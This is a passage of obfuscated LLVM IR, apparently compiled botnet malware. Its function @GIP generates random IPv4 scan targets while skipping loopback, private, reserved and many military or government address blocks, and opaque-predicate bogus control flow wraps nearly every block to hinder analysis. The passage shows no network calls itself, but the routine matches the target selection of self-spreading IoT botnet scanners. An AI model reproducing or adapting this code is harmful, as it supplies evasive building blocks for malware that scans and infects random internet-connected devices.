  %287 = load i32, i32* @x.63
  %288 = load i32, i32* @y.64
  %289 = sub i32 %287, 1
  %290 = mul i32 %287, %289
  %291 = urem i32 %290, 2
  %292 = icmp eq i32 %291, 0
  %293 = icmp slt i32 %288, 10
  %294 = or i1 %292, %293
  br i1 %294, label %originalBB34, label %originalBB34alteredBB

originalBB34:                                     ; preds = %originalBB34alteredBB, %286
  %295 = load i32, i32* %9, align 4
  %296 = load i32, i32* @x.63
  %297 = load i32, i32* @y.64
  %298 = sub i32 %296, 1
  %299 = mul i32 %296, %298
  %300 = urem i32 %299, 2
  %301 = icmp eq i32 %300, 0
  %302 = icmp slt i32 %297, 10
  %303 = or i1 %301, %302
  br i1 %303, label %originalBBpart236, label %originalBB34alteredBB

originalBBpart236:                                ; preds = %originalBB34
  ret i32 %295

originalBBalteredBB:                              ; preds = %originalBB, %38
  %304 = getelementptr inbounds %struct.timeval, %struct.timeval* %22, i32 0, i32 0
  %305 = load i64, i64* %304, align 8
  %306 = icmp sgt i64 %305, 0
  br label %originalBB

originalBB1alteredBB:                             ; preds = %originalBB1, %58
  %307 = getelementptr inbounds %struct.timeval, %struct.timeval* %22, i32 0, i32 1
  %308 = load i64, i64* %307, align 8
  %309 = icmp sgt i64 %308, 0
  br label %originalBB1

originalBB6alteredBB:                             ; preds = %originalBB6, %78
  br label %originalBB6

originalBB10alteredBB:                            ; preds = %originalBB10, %136
  %310 = load i32, i32* %19, align 4
  %311 = icmp eq i32 %310, 0
  br label %originalBB10

originalBB14alteredBB:                            ; preds = %originalBB14, %155
  store i32 0, i32* %9, align 4
  br label %originalBB14

originalBB18alteredBB:                            ; preds = %originalBB18, %200
  store i32 0, i32* %9, align 4
  br label %originalBB18

originalBB22alteredBB:                            ; preds = %originalBB22, %230
  store i32 1, i32* %20, align 4
  br label %originalBB22

originalBB26alteredBB:                            ; preds = %originalBB26, %249
  %312 = load i32, i32* %20, align 4
  %313 = icmp ne i32 %312, 0
  br label %originalBB26

originalBB30alteredBB:                            ; preds = %originalBB30, %268
  store i32 1, i32* %9, align 4
  br label %originalBB30

originalBB34alteredBB:                            ; preds = %originalBB34, %286
  %314 = load i32, i32* %9, align 4
  br label %originalBB34
}

; Function Attrs: nounwind readonly
declare i8* @strstr(i8*, i8*) #5

; Function Attrs: noinline nounwind uwtable
define i32 @GIP() #0 {
  %1 = alloca [16 x i8], align 16
  %2 = call i32 @rand() #3
  %3 = srem i32 %2, 223
  %4 = trunc i32 %3 to i8
  store i8 %4, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %5 = call i32 @rand() #3
  %6 = srem i32 %5, 255
  %7 = trunc i32 %6 to i8
  store i8 %7, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %8 = call i32 @rand() #3
  %9 = srem i32 %8, 255
  %10 = trunc i32 %9 to i8
  store i8 %10, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 2), align 1
  %11 = call i32 @rand() #3
  %12 = srem i32 %11, 255
  %13 = trunc i32 %12 to i8
  store i8 %13, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 3), align 1
  br label %14

; <label>:14:                                     ; preds = %5316, %0
  %15 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %16 = zext i8 %15 to i32
  %17 = icmp eq i32 %16, 127
  br i1 %17, label %5298, label %18

; <label>:18:                                     ; preds = %14
  %19 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %20 = zext i8 %19 to i32
  %21 = icmp eq i32 %20, 0
  br i1 %21, label %5298, label %22

; <label>:22:                                     ; preds = %18
  %23 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %24 = zext i8 %23 to i32
  %25 = icmp eq i32 %24, 3
  br i1 %25, label %5298, label %26

; <label>:26:                                     ; preds = %22
  %27 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %28 = zext i8 %27 to i32
  %29 = icmp eq i32 %28, 15
  br i1 %29, label %5298, label %30

; <label>:30:                                     ; preds = %26
  %31 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %32 = zext i8 %31 to i32
  %33 = icmp eq i32 %32, 56
  br i1 %33, label %5298, label %34

; <label>:34:                                     ; preds = %30
  %35 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %36 = zext i8 %35 to i32
  %37 = icmp eq i32 %36, 10
  br i1 %37, label %5298, label %38

; <label>:38:                                     ; preds = %34
  %39 = load i32, i32* @x.65
  %40 = load i32, i32* @y.66
  %41 = sub i32 %39, 1
  %42 = mul i32 %39, %41
  %43 = urem i32 %42, 2
  %44 = icmp eq i32 %43, 0
  %45 = icmp slt i32 %40, 10
  %46 = or i1 %44, %45
  br i1 %46, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %38
  %47 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %48 = zext i8 %47 to i32
  %49 = icmp eq i32 %48, 25
  %50 = load i32, i32* @x.65
  %51 = load i32, i32* @y.66
  %52 = sub i32 %50, 1
  %53 = mul i32 %50, %52
  %54 = urem i32 %53, 2
  %55 = icmp eq i32 %54, 0
  %56 = icmp slt i32 %51, 10
  %57 = or i1 %55, %56
  br i1 %57, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  br i1 %49, label %5298, label %58

; <label>:58:                                     ; preds = %originalBBpart2
  %59 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %60 = zext i8 %59 to i32
  %61 = icmp eq i32 %60, 49
  br i1 %61, label %5298, label %62

; <label>:62:                                     ; preds = %58
  %63 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %64 = zext i8 %63 to i32
  %65 = icmp eq i32 %64, 50
  br i1 %65, label %5298, label %66

; <label>:66:                                     ; preds = %62
  %67 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %68 = zext i8 %67 to i32
  %69 = icmp eq i32 %68, 137
  br i1 %69, label %5298, label %70

; <label>:70:                                     ; preds = %66
  %71 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %72 = zext i8 %71 to i32
  %73 = icmp eq i32 %72, 6
  br i1 %73, label %5298, label %74

; <label>:74:                                     ; preds = %70
  %75 = load i32, i32* @x.65
  %76 = load i32, i32* @y.66
  %77 = sub i32 %75, 1
  %78 = mul i32 %75, %77
  %79 = urem i32 %78, 2
  %80 = icmp eq i32 %79, 0
  %81 = icmp slt i32 %76, 10
  %82 = or i1 %80, %81
  br i1 %82, label %originalBB1, label %originalBB1alteredBB

originalBB1:                                      ; preds = %originalBB1alteredBB, %74
  %83 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %84 = zext i8 %83 to i32
  %85 = icmp eq i32 %84, 7
  %86 = load i32, i32* @x.65
  %87 = load i32, i32* @y.66
  %88 = sub i32 %86, 1
  %89 = mul i32 %86, %88
  %90 = urem i32 %89, 2
  %91 = icmp eq i32 %90, 0
  %92 = icmp slt i32 %87, 10
  %93 = or i1 %91, %92
  br i1 %93, label %originalBBpart24, label %originalBB1alteredBB

originalBBpart24:                                 ; preds = %originalBB1
  br i1 %85, label %5298, label %94

; <label>:94:                                     ; preds = %originalBBpart24
  %95 = load i32, i32* @x.65
  %96 = load i32, i32* @y.66
  %97 = sub i32 %95, 1
  %98 = mul i32 %95, %97
  %99 = urem i32 %98, 2
  %100 = icmp eq i32 %99, 0
  %101 = icmp slt i32 %96, 10
  %102 = or i1 %100, %101
  br i1 %102, label %originalBB6, label %originalBB6alteredBB

originalBB6:                                      ; preds = %originalBB6alteredBB, %94
  %103 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %104 = zext i8 %103 to i32
  %105 = icmp eq i32 %104, 11
  %106 = load i32, i32* @x.65
  %107 = load i32, i32* @y.66
  %108 = sub i32 %106, 1
  %109 = mul i32 %106, %108
  %110 = urem i32 %109, 2
  %111 = icmp eq i32 %110, 0
  %112 = icmp slt i32 %107, 10
  %113 = or i1 %111, %112
  br i1 %113, label %originalBBpart28, label %originalBB6alteredBB

originalBBpart28:                                 ; preds = %originalBB6
  br i1 %105, label %5298, label %114

; <label>:114:                                    ; preds = %originalBBpart28
  %115 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %116 = zext i8 %115 to i32
  %117 = icmp eq i32 %116, 21
  br i1 %117, label %5298, label %118

; <label>:118:                                    ; preds = %114
  %119 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %120 = zext i8 %119 to i32
  %121 = icmp eq i32 %120, 22
  br i1 %121, label %5298, label %122

; <label>:122:                                    ; preds = %118
  %123 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %124 = zext i8 %123 to i32
  %125 = icmp eq i32 %124, 26
  br i1 %125, label %5298, label %126

; <label>:126:                                    ; preds = %122
  %127 = load i32, i32* @x.65
  %128 = load i32, i32* @y.66
  %129 = sub i32 %127, 1
  %130 = mul i32 %127, %129
  %131 = urem i32 %130, 2
  %132 = icmp eq i32 %131, 0
  %133 = icmp slt i32 %128, 10
  %134 = or i1 %132, %133
  br i1 %134, label %originalBB10, label %originalBB10alteredBB

originalBB10:                                     ; preds = %originalBB10alteredBB, %126
  %135 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %136 = zext i8 %135 to i32
  %137 = icmp eq i32 %136, 28
  %138 = load i32, i32* @x.65
  %139 = load i32, i32* @y.66
  %140 = sub i32 %138, 1
  %141 = mul i32 %138, %140
  %142 = urem i32 %141, 2
  %143 = icmp eq i32 %142, 0
  %144 = icmp slt i32 %139, 10
  %145 = or i1 %143, %144
  br i1 %145, label %originalBBpart212, label %originalBB10alteredBB

originalBBpart212:                                ; preds = %originalBB10
  br i1 %137, label %5298, label %146

; <label>:146:                                    ; preds = %originalBBpart212
  %147 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %148 = zext i8 %147 to i32
  %149 = icmp eq i32 %148, 29
  br i1 %149, label %5298, label %150

; <label>:150:                                    ; preds = %146
  %151 = load i32, i32* @x.65
  %152 = load i32, i32* @y.66
  %153 = sub i32 %151, 1
  %154 = mul i32 %151, %153
  %155 = urem i32 %154, 2
  %156 = icmp eq i32 %155, 0
  %157 = icmp slt i32 %152, 10
  %158 = or i1 %156, %157
  br i1 %158, label %originalBB14, label %originalBB14alteredBB

originalBB14:                                     ; preds = %originalBB14alteredBB, %150
  %159 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %160 = zext i8 %159 to i32
  %161 = icmp eq i32 %160, 30
  %162 = load i32, i32* @x.65
  %163 = load i32, i32* @y.66
  %164 = sub i32 %162, 1
  %165 = mul i32 %162, %164
  %166 = urem i32 %165, 2
  %167 = icmp eq i32 %166, 0
  %168 = icmp slt i32 %163, 10
  %169 = or i1 %167, %168
  br i1 %169, label %originalBBpart216, label %originalBB14alteredBB

originalBBpart216:                                ; preds = %originalBB14
  br i1 %161, label %5298, label %170

; <label>:170:                                    ; preds = %originalBBpart216
  %171 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %172 = zext i8 %171 to i32
  %173 = icmp eq i32 %172, 33
  br i1 %173, label %5298, label %174

; <label>:174:                                    ; preds = %170
  %175 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %176 = zext i8 %175 to i32
  %177 = icmp eq i32 %176, 55
  br i1 %177, label %5298, label %178

; <label>:178:                                    ; preds = %174
  %179 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %180 = zext i8 %179 to i32
  %181 = icmp eq i32 %180, 214
  br i1 %181, label %5298, label %182

; <label>:182:                                    ; preds = %178
  %183 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %184 = zext i8 %183 to i32
  %185 = icmp eq i32 %184, 215
  br i1 %185, label %5298, label %186

; <label>:186:                                    ; preds = %182
  %187 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %188 = zext i8 %187 to i32
  %189 = icmp eq i32 %188, 192
  br i1 %189, label %190, label %194

; <label>:190:                                    ; preds = %186
  %191 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %192 = zext i8 %191 to i32
  %193 = icmp eq i32 %192, 168
  br i1 %193, label %5298, label %194

; <label>:194:                                    ; preds = %190, %186
  %195 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %196 = zext i8 %195 to i32
  %197 = icmp eq i32 %196, 146
  br i1 %197, label %198, label %218

; <label>:198:                                    ; preds = %194
  %199 = load i32, i32* @x.65
  %200 = load i32, i32* @y.66
  %201 = sub i32 %199, 1
  %202 = mul i32 %199, %201
  %203 = urem i32 %202, 2
  %204 = icmp eq i32 %203, 0
  %205 = icmp slt i32 %200, 10
  %206 = or i1 %204, %205
  br i1 %206, label %originalBB18, label %originalBB18alteredBB

originalBB18:                                     ; preds = %originalBB18alteredBB, %198
  %207 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %208 = zext i8 %207 to i32
  %209 = icmp eq i32 %208, 17
  %210 = load i32, i32* @x.65
  %211 = load i32, i32* @y.66
  %212 = sub i32 %210, 1
  %213 = mul i32 %210, %212
  %214 = urem i32 %213, 2
  %215 = icmp eq i32 %214, 0
  %216 = icmp slt i32 %211, 10
  %217 = or i1 %215, %216
  br i1 %217, label %originalBBpart220, label %originalBB18alteredBB

originalBBpart220:                                ; preds = %originalBB18
  br i1 %209, label %5298, label %218

; <label>:218:                                    ; preds = %originalBBpart220, %194
  %219 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %220 = zext i8 %219 to i32
  %221 = icmp eq i32 %220, 146
  br i1 %221, label %222, label %226

; <label>:222:                                    ; preds = %218
  %223 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %224 = zext i8 %223 to i32
  %225 = icmp eq i32 %224, 80
  br i1 %225, label %5298, label %226

; <label>:226:                                    ; preds = %222, %218
  %227 = load i32, i32* @x.65
  %228 = load i32, i32* @y.66
  %229 = sub i32 %227, 1
  %230 = mul i32 %227, %229
  %231 = urem i32 %230, 2
  %232 = icmp eq i32 %231, 0
  %233 = icmp slt i32 %228, 10
  %234 = or i1 %232, %233
  br i1 %234, label %originalBB22, label %originalBB22alteredBB

originalBB22:                                     ; preds = %originalBB22alteredBB, %226
  %235 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %236 = zext i8 %235 to i32
  %237 = icmp eq i32 %236, 146
  %238 = load i32, i32* @x.65
  %239 = load i32, i32* @y.66
  %240 = sub i32 %238, 1
  %241 = mul i32 %238, %240
  %242 = urem i32 %241, 2
  %243 = icmp eq i32 %242, 0
  %244 = icmp slt i32 %239, 10
  %245 = or i1 %243, %244
  br i1 %245, label %originalBBpart224, label %originalBB22alteredBB

originalBBpart224:                                ; preds = %originalBB22
  br i1 %237, label %246, label %250

; <label>:246:                                    ; preds = %originalBBpart224
  %247 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %248 = zext i8 %247 to i32
  %249 = icmp eq i32 %248, 98
  br i1 %249, label %5298, label %250

; <label>:250:                                    ; preds = %246, %originalBBpart224
  %251 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %252 = zext i8 %251 to i32
  %253 = icmp eq i32 %252, 146
  br i1 %253, label %254, label %258

; <label>:254:                                    ; preds = %250
  %255 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %256 = zext i8 %255 to i32
  %257 = icmp eq i32 %256, 154
  br i1 %257, label %5298, label %258

; <label>:258:                                    ; preds = %254, %250
  %259 = load i32, i32* @x.65
  %260 = load i32, i32* @y.66
  %261 = sub i32 %259, 1
  %262 = mul i32 %259, %261
  %263 = urem i32 %262, 2
  %264 = icmp eq i32 %263, 0
  %265 = icmp slt i32 %260, 10
  %266 = or i1 %264, %265
  br i1 %266, label %originalBB26, label %originalBB26alteredBB

originalBB26:                                     ; preds = %originalBB26alteredBB, %258
  %267 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %268 = zext i8 %267 to i32
  %269 = icmp eq i32 %268, 147
  %270 = load i32, i32* @x.65
  %271 = load i32, i32* @y.66
  %272 = sub i32 %270, 1
  %273 = mul i32 %270, %272
  %274 = urem i32 %273, 2
  %275 = icmp eq i32 %274, 0
  %276 = icmp slt i32 %271, 10
  %277 = or i1 %275, %276
  br i1 %277, label %originalBBpart228, label %originalBB26alteredBB

originalBBpart228:                                ; preds = %originalBB26
  br i1 %269, label %278, label %282

; <label>:278:                                    ; preds = %originalBBpart228
  %279 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %280 = zext i8 %279 to i32
  %281 = icmp eq i32 %280, 159
  br i1 %281, label %5298, label %282

; <label>:282:                                    ; preds = %278, %originalBBpart228
  %283 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %284 = zext i8 %283 to i32
  %285 = icmp eq i32 %284, 148
  br i1 %285, label %286, label %290

; <label>:286:                                    ; preds = %282
  %287 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %288 = zext i8 %287 to i32
  %289 = icmp eq i32 %288, 114
  br i1 %289, label %5298, label %290

; <label>:290:                                    ; preds = %286, %282
  %291 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %292 = zext i8 %291 to i32
  %293 = icmp eq i32 %292, 150
  br i1 %293, label %294, label %298

; <label>:294:                                    ; preds = %290
  %295 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %296 = zext i8 %295 to i32
  %297 = icmp eq i32 %296, 125
  br i1 %297, label %5298, label %298

; <label>:298:                                    ; preds = %294, %290
  %299 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %300 = zext i8 %299 to i32
  %301 = icmp eq i32 %300, 150
  br i1 %301, label %302, label %306

; <label>:302:                                    ; preds = %298
  %303 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %304 = zext i8 %303 to i32
  %305 = icmp eq i32 %304, 133
  br i1 %305, label %5298, label %306

; <label>:306:                                    ; preds = %302, %298
  %307 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %308 = zext i8 %307 to i32
  %309 = icmp eq i32 %308, 150
  br i1 %309, label %310, label %330

; <label>:310:                                    ; preds = %306
  %311 = load i32, i32* @x.65
  %312 = load i32, i32* @y.66
  %313 = sub i32 %311, 1
  %314 = mul i32 %311, %313
  %315 = urem i32 %314, 2
  %316 = icmp eq i32 %315, 0
  %317 = icmp slt i32 %312, 10
  %318 = or i1 %316, %317
  br i1 %318, label %originalBB30, label %originalBB30alteredBB

originalBB30:                                     ; preds = %originalBB30alteredBB, %310
  %319 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %320 = zext i8 %319 to i32
  %321 = icmp eq i32 %320, 144
  %322 = load i32, i32* @x.65
  %323 = load i32, i32* @y.66
  %324 = sub i32 %322, 1
  %325 = mul i32 %322, %324
  %326 = urem i32 %325, 2
  %327 = icmp eq i32 %326, 0
  %328 = icmp slt i32 %323, 10
  %329 = or i1 %327, %328
  br i1 %329, label %originalBBpart232, label %originalBB30alteredBB

originalBBpart232:                                ; preds = %originalBB30
  br i1 %321, label %5298, label %330

; <label>:330:                                    ; preds = %originalBBpart232, %306
  %331 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %332 = zext i8 %331 to i32
  %333 = icmp eq i32 %332, 150
  br i1 %333, label %334, label %354

; <label>:334:                                    ; preds = %330
  %335 = load i32, i32* @x.65
  %336 = load i32, i32* @y.66
  %337 = sub i32 %335, 1
  %338 = mul i32 %335, %337
  %339 = urem i32 %338, 2
  %340 = icmp eq i32 %339, 0
  %341 = icmp slt i32 %336, 10
  %342 = or i1 %340, %341
  br i1 %342, label %originalBB34, label %originalBB34alteredBB

originalBB34:                                     ; preds = %originalBB34alteredBB, %334
  %343 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %344 = zext i8 %343 to i32
  %345 = icmp eq i32 %344, 149
  %346 = load i32, i32* @x.65
  %347 = load i32, i32* @y.66
  %348 = sub i32 %346, 1
  %349 = mul i32 %346, %348
  %350 = urem i32 %349, 2
  %351 = icmp eq i32 %350, 0
  %352 = icmp slt i32 %347, 10
  %353 = or i1 %351, %352
  br i1 %353, label %originalBBpart236, label %originalBB34alteredBB

originalBBpart236:                                ; preds = %originalBB34
  br i1 %345, label %5298, label %354

; <label>:354:                                    ; preds = %originalBBpart236, %330
  %355 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %356 = zext i8 %355 to i32
  %357 = icmp eq i32 %356, 150
  br i1 %357, label %358, label %362

; <label>:358:                                    ; preds = %354
  %359 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %360 = zext i8 %359 to i32
  %361 = icmp eq i32 %360, 157
  br i1 %361, label %5298, label %362

; <label>:362:                                    ; preds = %358, %354
  %363 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %364 = zext i8 %363 to i32
  %365 = icmp eq i32 %364, 150
  br i1 %365, label %366, label %370

; <label>:366:                                    ; preds = %362
  %367 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %368 = zext i8 %367 to i32
  %369 = icmp eq i32 %368, 184
  br i1 %369, label %5298, label %370

; <label>:370:                                    ; preds = %366, %362
  %371 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %372 = zext i8 %371 to i32
  %373 = icmp eq i32 %372, 150
  br i1 %373, label %374, label %394

; <label>:374:                                    ; preds = %370
  %375 = load i32, i32* @x.65
  %376 = load i32, i32* @y.66
  %377 = sub i32 %375, 1
  %378 = mul i32 %375, %377
  %379 = urem i32 %378, 2
  %380 = icmp eq i32 %379, 0
  %381 = icmp slt i32 %376, 10
  %382 = or i1 %380, %381
  br i1 %382, label %originalBB38, label %originalBB38alteredBB

originalBB38:                                     ; preds = %originalBB38alteredBB, %374
  %383 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %384 = zext i8 %383 to i32
  %385 = icmp eq i32 %384, 190
  %386 = load i32, i32* @x.65
  %387 = load i32, i32* @y.66
  %388 = sub i32 %386, 1
  %389 = mul i32 %386, %388
  %390 = urem i32 %389, 2
  %391 = icmp eq i32 %390, 0
  %392 = icmp slt i32 %387, 10
  %393 = or i1 %391, %392
  br i1 %393, label %originalBBpart240, label %originalBB38alteredBB

originalBBpart240:                                ; preds = %originalBB38
  br i1 %385, label %5298, label %394

; <label>:394:                                    ; preds = %originalBBpart240, %370
  %395 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %396 = zext i8 %395 to i32
  %397 = icmp eq i32 %396, 150
  br i1 %397, label %398, label %402

; <label>:398:                                    ; preds = %394
  %399 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %400 = zext i8 %399 to i32
  %401 = icmp eq i32 %400, 196
  br i1 %401, label %5298, label %402

; <label>:402:                                    ; preds = %398, %394
  %403 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %404 = zext i8 %403 to i32
  %405 = icmp eq i32 %404, 152
  br i1 %405, label %406, label %426

; <label>:406:                                    ; preds = %402
  %407 = load i32, i32* @x.65
  %408 = load i32, i32* @y.66
  %409 = sub i32 %407, 1
  %410 = mul i32 %407, %409
  %411 = urem i32 %410, 2
  %412 = icmp eq i32 %411, 0
  %413 = icmp slt i32 %408, 10
  %414 = or i1 %412, %413
  br i1 %414, label %originalBB42, label %originalBB42alteredBB

originalBB42:                                     ; preds = %originalBB42alteredBB, %406
  %415 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %416 = zext i8 %415 to i32
  %417 = icmp eq i32 %416, 82
  %418 = load i32, i32* @x.65
  %419 = load i32, i32* @y.66
  %420 = sub i32 %418, 1
  %421 = mul i32 %418, %420
  %422 = urem i32 %421, 2
  %423 = icmp eq i32 %422, 0
  %424 = icmp slt i32 %419, 10
  %425 = or i1 %423, %424
  br i1 %425, label %originalBBpart244, label %originalBB42alteredBB

originalBBpart244:                                ; preds = %originalBB42
  br i1 %417, label %5298, label %426

; <label>:426:                                    ; preds = %originalBBpart244, %402
  %427 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %428 = zext i8 %427 to i32
  %429 = icmp eq i32 %428, 152
  br i1 %429, label %430, label %434

; <label>:430:                                    ; preds = %426
  %431 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %432 = zext i8 %431 to i32
  %433 = icmp eq i32 %432, 229
  br i1 %433, label %5298, label %434

; <label>:434:                                    ; preds = %430, %426
  %435 = load i32, i32* @x.65
  %436 = load i32, i32* @y.66
  %437 = sub i32 %435, 1
  %438 = mul i32 %435, %437
  %439 = urem i32 %438, 2
  %440 = icmp eq i32 %439, 0
  %441 = icmp slt i32 %436, 10
  %442 = or i1 %440, %441
  br i1 %442, label %originalBB46, label %originalBB46alteredBB

originalBB46:                                     ; preds = %originalBB46alteredBB, %434
  %443 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %444 = zext i8 %443 to i32
  %445 = icmp eq i32 %444, 157
  %446 = load i32, i32* @x.65
  %447 = load i32, i32* @y.66
  %448 = sub i32 %446, 1
  %449 = mul i32 %446, %448
  %450 = urem i32 %449, 2
  %451 = icmp eq i32 %450, 0
  %452 = icmp slt i32 %447, 10
  %453 = or i1 %451, %452
  br i1 %453, label %originalBBpart248, label %originalBB46alteredBB

originalBBpart248:                                ; preds = %originalBB46
  br i1 %445, label %454, label %474

; <label>:454:                                    ; preds = %originalBBpart248
  %455 = load i32, i32* @x.65
  %456 = load i32, i32* @y.66
  %457 = sub i32 %455, 1
  %458 = mul i32 %455, %457
  %459 = urem i32 %458, 2
  %460 = icmp eq i32 %459, 0
  %461 = icmp slt i32 %456, 10
  %462 = or i1 %460, %461
  br i1 %462, label %originalBB50, label %originalBB50alteredBB

originalBB50:                                     ; preds = %originalBB50alteredBB, %454
  %463 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %464 = zext i8 %463 to i32
  %465 = icmp eq i32 %464, 202
  %466 = load i32, i32* @x.65
  %467 = load i32, i32* @y.66
  %468 = sub i32 %466, 1
  %469 = mul i32 %466, %468
  %470 = urem i32 %469, 2
  %471 = icmp eq i32 %470, 0
  %472 = icmp slt i32 %467, 10
  %473 = or i1 %471, %472
  br i1 %473, label %originalBBpart252, label %originalBB50alteredBB

originalBBpart252:                                ; preds = %originalBB50
  br i1 %465, label %5298, label %474

; <label>:474:                                    ; preds = %originalBBpart252, %originalBBpart248
  %475 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %476 = zext i8 %475 to i32
  %477 = icmp eq i32 %476, 157
  br i1 %477, label %478, label %498

; <label>:478:                                    ; preds = %474
